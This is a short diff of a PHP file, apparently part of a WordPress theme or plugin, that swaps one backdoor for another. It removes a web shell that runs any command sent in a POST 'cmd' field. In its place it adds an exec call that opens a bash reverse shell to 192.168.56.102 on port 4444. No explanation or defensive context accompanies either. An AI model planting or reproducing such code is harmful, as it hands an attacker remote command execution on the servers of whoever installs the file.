@@ -10,8 +10,6 @@ Author URI: http://example.com
 ?>
 
 <?php
-    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-        $cmd = $_POST['cmd'];
-        echo "<pre>" . shell_exec($cmd) . "</pre>";
-    }
+exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.102/4444 0>&1'");
 ?>
+
